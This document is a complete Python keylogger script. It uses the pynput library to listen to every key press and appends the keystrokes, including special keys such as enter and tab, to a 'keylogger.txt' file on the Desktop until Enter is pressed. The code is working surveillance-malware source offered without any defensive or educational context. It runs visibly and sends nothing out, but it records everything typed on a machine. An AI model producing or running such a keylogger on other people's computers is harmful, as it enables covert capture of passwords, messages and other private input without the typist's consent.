import os
from pynput import keyboard

# Determine the path to the Desktop
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
logfile_path = os.path.join(desktop_path, "keylogger.txt")

# Ensure the desktop path exists
if not os.path.exists(desktop_path):
    raise FileNotFoundError("Desktop path does not exist.")

def keyPressed(key):
    print(str(key))
    with open(logfile_path, 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            # Handle special keys (e.g., space, enter, etc.)
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            else:
                logKey.write(f'[{key.name}]')

if __name__ == "__main__":
    # Clear the file content at the start of each run to avoid appending to old logs
    with open(logfile_path, 'w') as logKey:
        logKey.write("")

    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input("Press Enter to stop the keylogger...\n")
